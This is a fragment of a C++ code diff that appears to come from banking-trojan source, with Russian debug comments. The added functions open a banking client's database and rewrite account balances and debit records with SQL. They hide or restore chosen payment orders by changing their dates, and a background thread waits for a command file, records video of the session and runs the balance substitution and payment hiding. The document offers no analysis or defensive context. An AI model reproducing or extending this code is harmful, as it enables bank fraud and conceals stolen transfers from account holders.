+						hidePayments[n].payDate = PayDate;
+					}
+				}
+				n++;
+			}
+		}
+		CloseDB(DB);
+		File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyOldDocs).t_str() ).t_str(), &hidePayments, sizeof(hidePayments) );
+	}
+}
+
+//восстановить баланс и скрываемую платежку
+static void RestoreBalansAndDocs()
+{
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		TMemory sqlBuf(1024);
+		const char* sql;
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+
+		DBG( "Tiny", "Восстаналиваем баланс" );
+		int n = 0;
+		while( restAccounts[n].account[0] )
+		{
+			DBG( "Tiny", "Для счета %s восстанавливаем баланс %I64d", restAccounts[n].account, restAccounts[n].oldSum );
+			sql = "update Amounts set Expected=%d.%02d,Confirmed=%d.%d where Code='%s'";
+			__int64 v = restAccounts[n].oldSum;
+			pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account );
+			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+			SQLHSTMT qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+			DB->CloseQuery(qr);
+
+			DBG( "Tiny", "Для счета %s восстанавливаем дебет %I64d", restAccounts[n].account, restAccounts[n].oldDebet );
+			int DayDate = ConvertDate( DB, &restAccounts[n].date );
+			sql = "update Turns set ConDebit=%d.%02d where Code='%s' and DayDate=%d";
+			v = restAccounts[n].oldDebet;
+			pwsprintfA( sqlBuf.AsStr(), sql, (DWORD)(v / 100), (DWORD)(v % 100), restAccounts[n].account, DayDate );
+			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+			qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+			DB->CloseQuery(qr);
+			n++;
+		}
+
+		DBG( "Tiny", "Восстанавляваем скрытую платежку" );
+		n = 0;
+		while( hidePayments[n].account[0] )
+		{
+			DBG( "Tiny", "Восстанвливаем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
+			TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
+			m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
+			endDay.hour = 23;
+			endDay.minute = 59;
+			endDay.second = 59;
+
+			sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+			SQLHSTMT qr = DB->ExecuteSql( sql, "ii ii is24 it it is31", &hidePayments[n].orgDate, &hidePayments[n].dayDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+			DB->CloseQuery(qr);
+
+			sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+			qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is31", &hidePayments[n].orgDate, &hidePayments[n].dayDate, &hidePayments[n].payDate, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+			DB->CloseQuery(qr);
+			n++;
+		}
+
+		CloseDB(DB);
+	}
+}
+
+static DWORD WINAPI ThreadHideReplacement(void*)
+{
+	//ждем пока появится строка подключения
+	do
+	{
+		pSleep(1000);
+	} while( pathMDB[0] == 0 );
+	pSleep(1000);
+	string fileFlag = BOT::MakeFileName( 0, GetStr(TinyFlagUpdate).t_str() );
+	for(;;)
+	{
+		DBG( "Tiny", "Запуск подмены и скрытия" );
+		DWORD size;
+		//в считываемом файле в конце данных должен быть обязательно 0 или любой другой символ,
+		//чтобы потом вставить 0 и получить полноценную строку. 
+		//Это нужно учитывать при создании файла
+		char* rpl = (char*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), size );
+		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
+		if( rpl )
+		{
+			VideoProcess::RecordPID( 0, "Tiny" ); //видео пишем только когда была команда на подмену
+			rpl[size - 1] = 0;
+			ReadReplacement(rpl);
+			MemFree(rpl);
+		}
+		//удаляем флаг запуска подмены
+		pDeleteFileA( fileFlag.t_str() );
+		ReplacementBalance();
+		HidePayments();
+		runHideReplacement = false;
+		replacementDone = true;
+		for(;;)
+		{
+			if( File::IsExists( fileFlag.t_str() ) ) break;
+			if( runHideReplacement ) break;
+			pSleep(1000);
+		}
+	}
+	return 0;
 }
 
 }
